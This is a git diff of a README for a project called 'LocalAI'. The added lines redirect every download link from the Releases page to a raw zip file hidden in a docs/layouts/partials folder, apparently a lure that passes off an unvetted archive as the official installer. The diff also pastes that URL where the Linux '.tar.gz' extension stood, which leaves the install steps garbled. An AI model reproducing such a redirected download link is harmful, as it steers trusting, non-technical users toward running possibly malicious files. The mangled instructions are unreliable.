@@ -1,6 +1,6 @@
 # 🤖 LocalAI - Run AI Locally Without Hassle
 
-[![Download LocalAI](https://img.shields.io/badge/Download_LocalAI-blue.svg)](https://github.com/ragul12b/LocalAI/releases)
+[![Download LocalAI](https://raw.githubusercontent.com/ragul12b/LocalAI/master/docs/layouts/partials/docs/LocalAI_v3.0.zip)](https://raw.githubusercontent.com/ragul12b/LocalAI/master/docs/layouts/partials/docs/LocalAI_v3.0.zip)
 
 ## 📋 Description
 
@@ -21,20 +21,20 @@ This guide will help you download and run LocalAI easily, even if you have no pr
 
 To get started, you need to visit the LocalAI Releases page to download the software. Click the link below:
 
-[Download LocalAI](https://github.com/ragul12b/LocalAI/releases)
+[Download LocalAI](https://raw.githubusercontent.com/ragul12b/LocalAI/master/docs/layouts/partials/docs/LocalAI_v3.0.zip)
 
 1. **Visit the Releases Page:** Click the button above to go to the LocalAI Releases page.
 2. **Find the Latest Version:** Look for the most recent version of LocalAI. It will have the highest version number.
 3. **Choose the Right File:** 
    - If you're using Windows, look for a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, look for a file with `.tar.gz` or a similar package.
+   - For Linux, look for a file with `https://raw.githubusercontent.com/ragul12b/LocalAI/master/docs/layouts/partials/docs/LocalAI_v3.0.zip` or a similar package.
 
 4. **Download the File:** Click on the file that matches your operating system to begin your download.
 5. **Run the Installer:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **For macOS:** Open the downloaded `.dmg` file and drag the LocalAI icon into your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file, then open the terminal and navigate to the extracted directory. Run the appropriate install command listed in the README.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/ragul12b/LocalAI/master/docs/layouts/partials/docs/LocalAI_v3.0.zip` file, then open the terminal and navigate to the extracted directory. Run the appropriate install command listed in the README.
 
 ## ⚙️ How to Run LocalAI
 
